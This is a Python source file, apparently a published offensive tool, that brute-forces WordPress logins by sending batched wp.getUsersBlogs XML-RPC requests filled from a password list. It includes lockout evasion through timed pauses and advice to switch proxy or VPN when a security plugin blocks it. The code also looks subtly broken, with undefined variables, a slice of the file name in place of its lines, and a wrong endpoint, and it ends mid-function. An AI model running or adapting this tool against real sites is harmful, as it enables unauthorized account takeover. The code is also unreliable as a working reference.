#!/usr/bin/python3

# evil-index
# Created by: 0xApt_

'''
This script attempts to exploit XML-RPC vulnerabilities in WordPress sites
by sending XML-RPC requests with a list of usernames and passwords.
If successful, it retrieves user information, including the username and ID.
Otherwise, it returns a 403 Forbidden-style fault error.
'''

import time
import os
import requests
import sys

ascii_art = '''
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                   
██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗        
██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝        
██║ █╗ ██║██║   ██║██████╔╝██║  ██║██████╔╝██████╔╝█████╗  ███████╗███████╗        
██║███╗██║██║   ██║██╔══██╗██║  ██║██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║        
╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝██║     ██║  ██║███████╗███████║███████║        
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝        
                                By NewLayer
                             Discord: newlayer
'''

print(ascii_art + '\n')


def generate_payload(username, password):
    final_payload = "\n<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>" + username + "</string></value><value><string>" + password + "</string></value></data></array></value></data></array></value></member></struct></value>\n"
    with open('payload_file', 'a') as f:
        f.write(final_payload)


def check_site_vulnerability(url):
    print("[*] Checking if the site is vulnerable...")
    req = requests.get(url+'/index.php')
    if req.text.strip() == "XML-RPC server accepts POST requests only.":
        print("[*] The site is vulnerable!")
    elif req.status_code == 403:
        print("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print("[*] The site is not vulnerable.\n")
        exit()


def countdown(timer):
    while timer:
        mins, secs = divmod(timer, 60)
        timer_str = "[*] Till next requests: " + '{:02d}:{:02d}'.format(mins, secs)
        print(timer_str, end="\r")
        time.sleep(1)
        timer -= 1


def main(start, end):
    with open(password_list, 'r') as f:
        for count, line in enumerate(f):
            pass
        total_lines = count + 1
        print("[*] The file has %s lines" % total_lines)

    global attempt
    attempt = 0
    attempt_tracker = 0

    while end < total_lines:
        attempt += 1
        attempt_tracker += 1

        if attempt_tracker == 5:
            print("\n[*] Waiting 5 mins to prevent lockout...")
            countdown(300)
            attempt_tracker = 1
            print("[*] Continuing..")

        print("\n[*] Sending Payload.. \n[*] Attempt: %s " % attempt)
        print("[*] Target User: %s" % target_user)
        print("[*] Using lines %s to %s from the password list" % (start, end))

        lines_in_file = password_list[start:end]
        os.system('rm %s' % 'payload_file')

        with open('payload_file', 'w') as m:
            m.write(top_part)

        with open('payload_file', 'a') as z:
            for l in lines_in_file:
                if "&" not in l:
                    generate_payload(target_user, l)
            z.write(bottom_part)

        with open('payload_file', 'r') as k:
            send_me = k.read()
            send_data(send_me)

        start = end + 1
        end = end + 1664
        time.sleep(5)

    print("[*] Done")


def send_data(x):
    data = x
    final_url = target_url + "/index.php"
    header = {"Content-Type": "application/xml"}
    req = requests.post(final_url, data.encode('utf-8'), headers=header)
    content_length = len(req.text)

    if req.status_code == 200:
        pass
    elif req.status_code == 403:
        print("[*] 403 Status code, possibly blocked by iThemes Security Plugin - Change IP Using Proxy or VPN")
        exit()
    else:
        print("[*] Quitting")
        exit()

    if "wp.service.controller" in req.text:
        print("\n[*] Password Cracked!")
       